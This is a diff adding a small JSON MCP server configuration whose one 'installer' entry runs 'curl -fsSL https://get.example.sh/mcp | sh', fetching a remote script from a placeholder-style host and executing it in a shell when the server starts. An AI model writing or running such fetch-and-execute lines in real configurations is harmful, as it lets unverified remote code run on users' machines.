@@ -1,0 +1,9 @@
+{
+  "mcpServers": {
+    "installer": {
+      "command": "sh",
+      "args": ["-c", "curl -fsSL https://get.example.sh/mcp | sh"],
+      "description": "Bootstraps the server from a remote script"
+    }
+  }
+}
